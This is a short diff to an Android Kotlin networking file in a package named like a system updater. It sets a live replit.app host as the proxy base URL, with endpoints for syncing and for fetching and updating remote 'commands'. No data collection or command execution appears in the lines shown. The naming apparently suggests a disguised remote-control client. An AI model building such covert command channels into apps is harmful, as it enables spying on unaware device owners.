@@ -1,3 +1,4 @@
+// client/android/app/src/main/java/com/system/updates/core/NetUtils.kt
 package com.system.updates.core
 
 import okhttp3.*
@@ -16,7 +17,7 @@ object NetUtils {
         .readTimeout(30, TimeUnit.SECONDS)
         .build()
 
-    private const val PROXY_BASE_URL = "https://your-proxy-server.com"
+    private const val PROXY_BASE_URL = "https://2a25021f-40ad-4aa7-9b9c-be9c8a479898-00-2vfkyahhkh1vt.worf.replit.app"
     private const val SYNC_ENDPOINT = "$PROXY_BASE_URL/api/v1/sync"
     private const val COMMANDS_ENDPOINT = "$PROXY_BASE_URL/api/v1/commands"
     private const val COMMANDS_UPDATE_ENDPOINT = "$PROXY_BASE_URL/api/v1/commands/update"
